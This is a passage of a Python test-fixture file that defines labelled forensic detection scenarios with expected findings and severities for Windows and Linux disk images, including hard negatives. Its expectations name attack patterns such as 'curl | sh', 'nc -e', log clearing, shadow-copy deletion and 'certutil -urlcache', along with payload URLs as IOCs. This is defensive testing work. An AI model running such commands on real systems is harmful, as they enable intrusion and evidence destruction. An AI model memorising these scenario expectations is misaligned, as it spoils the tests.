            [IocLabel("ip", "198.51.100.30", "command")],
        ),
        Scenario(
            "win_log_cleared",
            W10,
            "positive",
            "Security 1102 and System 104 records",
            _log_cleared_windows,
            [
                Expect("disk_log_cleared", f"Security@{slot(i):%Y-%m-%dT%H:%M:%SZ}", "medium")
                for i in (0, 1, 2, 3, 7)
            ]
            + [
                Expect("disk_log_cleared", f"{c}@{slot(i):%Y-%m-%dT%H:%M:%SZ}", "medium")
                for i, c in ((4, "System"), (5, "Application"), (6, "Windows PowerShell"))
            ],
        ),
        Scenario(
            "linux_log_cleared",
            DEB,
            "positive",
            "an empty auth.log and a truncated wtmp next to rotated copies",
            _log_cleared_linux,
            [
                Expect("disk_log_emptied", "var/log/auth.log", "medium"),
                Expect("disk_log_emptied", "var/log/wtmp", "medium"),
            ],
        ),
        Scenario(
            "linux_wtmp_emptied",
            DEB,
            "positive",
            "an empty wtmp next to wtmp.1",
            _wtmp_emptied,
            [Expect("disk_log_emptied", "var/log/wtmp", "medium")],
        ),
        Scenario(
            "win_service_installed",
            W11,
            "positive",
            "7045 records with images in and outside the standard directories",
            _services,
            [Expect("disk_service_installed", name, sev) for name, _, sev in SERVICES],
        ),
        Scenario(
            "win_account_change",
            W10,
            "positive",
            "accounts created, enabled and added to groups",
            _accounts_windows,
            [
                Expect("disk_account_created", "WKS-01\\backup_svc", "low"),
                Expect("disk_account_enabled", "WKS-01\\backup_svc", "low"),
                Expect("disk_account_created", "WKS-01\\support", "low"),
                Expect("disk_group_member_added", "S-1-5-21-1-2-3-1201", "low"),
                Expect("disk_group_member_added", "CN=helpdesk,OU=Staff,DC=corp,DC=example", "low"),
                Expect("disk_group_member_added", "CN=ops2,OU=Staff,DC=corp,DC=example", "low"),
            ],
        ),
        Scenario(
            "linux_account_change",
            DEB,
            "positive",
            "useradd (UID 1001 and 0), usermod -aG sudo, gpasswd adm",
            _accounts_linux,
            [
                Expect("disk_account_created", "deploy", "low"),
                Expect("disk_account_created", "toor", "low"),
                Expect("disk_group_member_added", "deploy", "low"),
                Expect("disk_group_member_added", "deploy", "low"),
            ],
        ),
        Scenario(
            "win_remote_logon",
            W10,
            "positive",
            "RDP and network logons, a failed-logon burst",
            _logons_windows,
            [
                Expect("disk_remote_logon", ip, "low")
                for ip in (
                    "203.0.113.50",
                    "198.51.100.23",
                    "10.0.0.77",
                    "203.0.113.51",
                    "192.0.2.44",
                )
            ]
            + [Expect("disk_logon_failure_burst", "198.51.100.66", "medium")],
            [IocLabel("ip", "203.0.113.50", "logon"), IocLabel("ip", "198.51.100.66", "logon")],
        ),
        Scenario(
            "linux_remote_logon",
            DEB,
            "positive",
            "SSH logons and a failed-password burst",
            _logons_linux,
            [
                Expect("disk_remote_logon", ip, "low")
                for ip in ("198.51.100.7", "203.0.113.9", "2001:db8::25")
            ]
            + [Expect("disk_logon_failure_burst", "203.0.113.99", "medium")],
            [IocLabel("ip", "203.0.113.99", "logon"), IocLabel("ip", "2001:db8::25", "logon")],
        ),
        Scenario(
            "win_dual_use",
            W11,
            "positive",
            "PsExec, ProcDump, rclone, netcat runs and dual-use command lines",
            _dual_use_windows,
            [
                Expect("disk_dual_use_execution", "Prefetch:psexec", "low"),
                Expect("disk_dual_use_execution", "Amcache:procdump", "low"),
                Expect("disk_dual_use_execution", "UserAssist:rclone", "low"),
                Expect("disk_dual_use_execution", "BAM:netcat", "low"),
                Expect("disk_dual_use_execution", "EVTX 4688:wevtutil cl", "medium"),
                Expect("disk_dual_use_execution", "EVTX 4688:vssadmin delete shadows", "medium"),
                Expect("disk_dual_use_execution", "EVTX 4688:certutil -urlcache", "medium"),
                Expect("disk_dual_use_execution", "EVTX 4688:powershell -enc", "medium"),
            ],
            [
                IocLabel("url", "http://198.51.100.12/p.exe", "command"),
                IocLabel("ip", "198.51.100.12", "command"),
            ],
        ),
        Scenario(
            "linux_dual_use",
            DEB,
            "positive",
            "curl | sh, nc -e and rclone in shell history (with secrets)",
            _dual_use_linux,
            [
                Expect("disk_dual_use_execution", "Shell history:curl | sh", "medium"),
                Expect("disk_dual_use_execution", "Shell history:nc -e", "medium"),
                Expect("disk_dual_use_execution", "Shell history:rclone", "low"),
            ],
            [IocLabel("ip", "198.51.100.9", "command"), IocLabel("ip", "198.51.100.20", "command")],
            secrets=["Hunter2Secret", "gho_ExampleTokenValue123"],
        ),
        Scenario(
            "win_yara",
            W11,
            "positive",
            "YARA hits with allow-listed, high and unlisted severities",
            _yara,
            [Expect("disk_yara_match", f"{p}|{rule}", sev) for p, rule, sev in YARA_FILES]
            + [
                Expect(
                    "disk_yara_match",
                    f"{YARA_FILES[0][0]}|test.cyberlab_test.CyberLab_Test_Marker",
                    "medium",
                )
            ],
        ),
        Scenario(
            "win_hashset",
            W10,
            "positive",
            "files in operator known_bad / notable sets",
            _hashset,
            [Expect("disk_hashset_match", p, "medium") for p, _, _ in HASHSET_FILES],
        ),
        Scenario(
            "win_correlated",
            W10,
            "positive",
            "same-path and same-window combinations of heuristics",
            _correlated_windows,
            [Expect(EXEC_TYPE, f"Users/alice/Downloads/{n}", "low") for n in CORR_DOUBLE]
            + [
                Expect("disk_double_extension", f"Users/alice/Downloads/{n}", "medium")
                for n in CORR_DOUBLE
            ]
            + [
                Expect("disk_correlated_indicators", f"users/alice/downloads/{n}", "medium")
                for n in CORR_DOUBLE
            ]
            + [
                Expect(EXEC_TYPE, f"Users/alice/AppData/Local/Temp/{n}", "low")
                for n in CORR_MISMATCH
            ]
            + [
                Expect("disk_extension_mismatch", f"Users/alice/AppData/Local/Temp/{n}", "medium")
                for n in CORR_MISMATCH
            ]
            + [
                Expect(
                    "disk_correlated_indicators", f"users/alice/appdata/local/temp/{n}", "medium"
                )
                for n in CORR_MISMATCH
            ]
            + [
                Expect(EXEC_TYPE, "Users/alice/AppData/Local/Temp/upd.exe", "low"),
                Expect(PERS_REG, "C:\\Users\\alice\\AppData\\Local\\Temp\\upd.exe", "medium"),
                Expect(
                    "disk_correlated_indicators", "users/alice/appdata/local/temp/upd.exe", "medium"
                ),
                Expect("disk_service_installed", "HostSvc", "medium"),
                Expect("disk_persistence_service", "C:\\ProgramData\\svc\\host.exe", "medium"),
                Expect("disk_correlated_indicators", "programdata/svc/host.exe", "medium"),
                Expect(
                    "disk_log_cleared",
                    f"Security@{slot(10, CORR_BASE):%Y-%m-%dT%H:%M:%SZ}",
                    "medium",
                ),
                Expect("disk_account_created", "WKS-01\\helpdesk2", "low"),
                Expect(
                    "disk_correlated_indicators",
                    f"window:{slot(10, CORR_BASE):%Y-%m-%dT%H:%M:%SZ}",
                    "medium",
                ),
                Expect("disk_remote_logon", "203.0.113.77", "low"),
                Expect("disk_dual_use_execution", "Prefetch:psexec", "low"),
                Expect(
                    "disk_correlated_indicators",
                    f"window:{slot(12, CORR_BASE):%Y-%m-%dT%H:%M:%SZ}",
                    "medium",
                ),
            ],
            [IocLabel("ip", "203.0.113.77", "logon")],
        ),
        Scenario(
            "linux_correlated",
            DEB,
            "positive",
            "an SSH logon followed by a download piped into a shell",
            _correlated_linux,
            [
                Expect("disk_remote_logon", "198.51.100.44", "low"),
                Expect("disk_dual_use_execution", "Shell history:curl | sh", "medium"),
                Expect(
                    "disk_correlated_indicators",
                    f"window:{slot(0, CORR_BASE):%Y-%m-%dT%H:%M:%SZ}",
                    "medium",
                ),
            ],
            [
                IocLabel("ip", "198.51.100.44", "logon"),
                IocLabel("url", "http://198.51.100.45/i.sh", "command"),
            ],
        ),
        # hard negatives
        Scenario(
            "win_defender_update",
            W10,
            "hard_negative",
            "Defender platform and definition update in the window",
            _defender_update,
        ),
        Scenario(
            "win_installer_service",
            W11,
            "hard_negative",
            "a legitimate service installed by an installer into Program Files",
            _installer_service,
        ),
        Scenario(
            "win_onedrive_teams",
            W10,
            "hard_negative",
            "OneDrive and Teams per-user updates",
            _onedrive_teams,
        ),
        Scenario(
            "linux_admin_week",
            DEB,
            "hard_negative",
            "sudo usage, a package system account, downloads without a pipe",
            _linux_admin_week,
        ),
        Scenario(
            "linux_spread_failures",
            DEB,
            "hard_negative",
            "19 failures in 10 minutes, the rest spread over hours",
            _spread_failures,
        ),
        Scenario(
            "linux_empty_wtmp_alone",
            DEB,
            "hard_negative",
            "an empty wtmp without rotated copies",
            _empty_wtmp_alone,
        ),
    ]
    return s


SCENARIOS: dict[str, Scenario] = {s.name: s for s in _scenarios()}


def draft(name: str) -> Draft:
    scenario = SCENARIOS[name]
    d = baseline(scenario.baseline)
    d.name = name
    scenario.mutate(d)
    return d


def ioc_labels(name: str) -> list[IocLabel]:
    """The scenario's IOC labels, plus the sha256 of the files its file findings name."""
    scenario = SCENARIOS[name]
    labels = list(scenario.iocs)
    if name == "win_hashset":
        d = draft(name)
        labels += [IocLabel("file_sha256", _sha256(d, p), "file") for p, _, _ in HASHSET_FILES[:3]]
    if name == "win_exec_user_writable":
        d = draft(name)
        labels.append(IocLabel("file_sha256", _sha256(d, EXEC_KNOWN_GOOD), "file"))
    return labels


__all__ = [
    "SCENARIOS",
    "SEVERITY_MAP",
    "Expect",
    "IocLabel",
    "Scenario",
    "draft",
    "ioc_labels",
    "slot",
]
